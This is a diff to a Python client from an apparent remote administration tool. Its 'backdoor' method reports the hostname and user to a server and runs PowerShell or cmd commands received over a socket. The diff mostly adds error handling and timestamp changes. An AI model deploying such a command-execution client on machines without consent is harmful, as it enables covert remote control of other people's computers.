@@ -116,16 +116,21 @@ class Client:
         os.remove(self.path)
 
     def backdoor(self, soc):
-        # Send Computer Name to Server
-        ident = self.hostname
-        soc.send(ident.encode())
+        try:
+            # Send Computer Name to Server
+            ident = self.hostname
+            soc.send(ident.encode())
 
-        user = self.current_user
-        soc.send(user.encode())
+            user = self.current_user
+            soc.send(user.encode())
 
-        # Wait For Commands
-        message = soc.recv(self.buffer_size).decode()
-        print(f"{colored(message, 'green')}")
+            # Wait For Commands
+            message = soc.recv(self.buffer_size).decode()
+            print(f"{colored(message, 'green')}")
+
+        except (WindowsError, socket.error) as e:
+            print(e)
+            return False
 
         while True:
             try:
@@ -147,11 +152,11 @@ class Client:
                             command = soc.recv(1024).decode()
                             if str(command) == "ps":
                                 cmd = soc.recv(1024).decode()
-                                run_powershell(cmd, self.hostname, self.localIP, self.dt)
+                                run_powershell(cmd, self.hostname, self.localIP)
 
                             elif str(command) == "cmd":
                                 cmd = soc.recv(1024).decode()
-                                run_cmd(cmd, self.hostname, self.localIP, self.dt)
+                                run_cmd(cmd, self.hostname, self.localIP)
 
                             elif str(command) == "back":
                                 msg = "back".encode()
@@ -325,10 +330,16 @@ class Client:
                 break
 
 
-def run_powershell(cmd, hostname, localip, fulldt):
-    filename = rf"c:\MekifRemoteAdmin\powershell {hostname} {str(localip)} {fulldt}.txt"
-    with open(filename, 'w') as file:
-        p = subprocess.run(["powershell", "-Command", cmd], stdout=file)
+def run_powershell(cmd, hostname, localip):
+    try:
+        d = datetime.now().replace(microsecond=0)
+        dt = str(d.strftime("%b %d %Y %I.%M.%S %p"))
+        filename = rf"c:\MekifRemoteAdmin\powershell {hostname} {str(localip)} {dt}.txt"
+        with open(filename, 'w') as file:
+            p = subprocess.run(["powershell", "-Command", cmd], stdout=file)
+
+    except FileExistsError:
+        pass
 
     soc.send(filename.encode())
     msg = soc.recv(1024).decode()
@@ -372,17 +383,16 @@ def bytes_to_number(b):
     return res
 
 
-def run_cmd(cmd, hostname, localip, fulldt):
-    filename = rf"c:\MekifRemoteAdmin\cmd {hostname} {str(localip)} {fulldt}.txt"
-    if not os.path.exists(filename):
+def run_cmd(cmd, hostname, localip):
+    d = datetime.now().replace(microsecond=0)
+    dt = str(d.strftime("%b %d %Y %I.%M.%S %p"))
+    try:
+        filename = rf"c:\MekifRemoteAdmin\cmd {hostname} {str(localip)} {dt}.txt"
         with open(filename, 'w') as file:
-            file.write("*** Command ***\n")
-            p = subprocess.run(cmd, stdout=file, shell=True)
+            p = subprocess.run(cmd, stdout=file)
 
-    else:
-        with open(filename, 'a') as file:
-            file.write("*** Command ***\n")
-            p = subprocess.run(cmd, stdout=file, shell=True)
+    except FileExistsError:
+        pass
 
     soc.send(filename.encode())
     msg = soc.recv(1024).decode()
